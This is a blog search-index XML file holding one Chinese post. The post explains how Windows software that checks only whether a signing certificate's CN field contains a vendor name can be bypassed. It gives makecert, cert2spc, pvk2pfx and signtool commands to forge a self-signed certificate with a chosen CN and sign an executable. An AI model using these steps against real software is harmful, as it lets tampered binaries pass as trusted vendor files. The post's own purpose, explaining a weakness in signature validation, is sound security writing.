<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>签名校验绕过漏洞</title>
      <link href="/2023/04/19/signature-bypass/"/>
      <url>/2023/04/19/signature-bypass/</url>
      
        <content type="html"><![CDATA[<p>目前，应用一般都会对自研模块对文件进行签名，并在软件启动时候校验签名信息，以保证软件对完整性.一些软件厂商除了使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/wintrust/nf-wintrust-winverifytrust">WinVerifyTrust</a>校验签名有效性外，还会对签名对CN字段进行校验，以便确认该文件是否是预期对证书签发（因为攻击者可能使用泄漏到网络对合法签名证书进行签名）。但是，如果仅仅通过判断CN字段是否包含特定字段，则完全可以被绕过。</p><h2 id="工具依赖"><a href="#工具依赖" class="headerlink" title="工具依赖"></a>工具依赖</h2><p>makecert.exe<br>cert2spc.exe<br>pvk2pfx.exe<br>signtool.exe<br>如果已经安装了微软对SDK，那么以上工具将会默认安装，不需要单独安装。推荐通过安装SDKi方式进行安装，以避免出现依赖缺少的n问题。<br>同时，为了方便使用，建议将以上工具路径添加到系统对环境变量。</p><h2 id="生成自签名的根证书"><a href="#生成自签名的根证书" class="headerlink" title="生成自签名的根证书"></a>生成自签名的根证书</h2><p>makecert.exe -sv D:\mykey.pvk -n “CN&#x3D;my company name” D:\myCert.cer -a SHA256<br>注意：如果CN字段包含特殊字符，比如英文的句号.逗号,，则需要使用转义符号\将整个CN包括起来。<br>比如，-n “CN&#x3D;&quot;XXX Co., Ltd.&quot;”<br>该命令会弹出私钥保护口令，三次</p><h2 id="创建spc文件"><a href="#创建spc文件" class="headerlink" title="创建spc文件"></a>创建spc文件</h2><p>cert2spc.exe D:\myCert.cer D:\mycet.spc</p><h2 id="将公钥和私钥合并成一个pfx格式对s证书文件"><a href="#将公钥和私钥合并成一个pfx格式对s证书文件" class="headerlink" title="将公钥和私钥合并成一个pfx格式对s证书文件"></a>将公钥和私钥合并成一个pfx格式对s证书文件</h2><p>pvk2pfx.exe -pvk D:\mykey.pvk -pi password -spc D:\mycert.spc -pfx D:\mykey.pfx -po password</p><h2 id="签署目标文件"><a href="#签署目标文件" class="headerlink" title="签署目标文件"></a>签署目标文件</h2><p>signtool.exe sign &#x2F;v &#x2F;as &#x2F;fd sha256 &#x2F;f “mykey.pfx” &#x2F;p “password” &#x2F;tr <a href="http://timestamp.digicert.com/">http://timestamp.digicert.com</a> “myfile.exe”</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
